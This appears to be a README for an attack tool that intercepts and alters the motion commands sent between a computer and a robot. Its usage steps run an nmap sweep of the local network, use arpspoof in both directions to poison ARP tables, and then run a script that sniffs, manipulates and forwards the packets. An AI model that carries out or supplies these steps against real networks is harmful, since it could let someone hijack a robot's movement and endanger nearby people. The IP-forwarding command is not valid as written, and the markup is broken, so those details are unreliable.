<section>
    <h2>#Pre-requisites</h1>
    <article>
        The following software is required:
        <ul>
            <li>Python (preference >= 3.8)</li>
            <li>Scapy (2.4.5) -> `$ sudo apt install scapy && python -m pip install scapy`</li>
            <li>arpspoof (2.4) -> `$ sudo apt install arpspoof`</li>
            <li>Turn off IP forwarding, if enabled -> `$ sudo net.ipv4.ip_forward=0`</li>
        </ul>
    <article>
</secion>
<section>
    <h2>#Usage</h2>
    <article>
        The first step is to scan the network to find the target computers information. Nmap is a good tool for this (`$ nmap -sn 192.168.1.0/24`). Once you have the IP address of the computers, you can begin.<br>
        Firstly, you need to poison the ARP tables of both the target computer (TARGET_A) and robot (TARGET_B). To do this, run the following commands:<br>
        `$ sudo arpspoof -t TARGET_A_IP TARGET_B_IP` <br> 
        `$ sudo arpspoof -t TARGET_B_IP TARGET_A_IP` <br>
        If you don't have the MAC addresses of the computers, you can get them at this point using `$ arp`.<br>
        Next fill in the required information in the script `geometry_msgs_twist_pitm.py`.<br>
        Finally, you can run the script `geometry_msgs_twist_pitm.py` to sniff, manipulate, and forward packets.
    </article>
</section>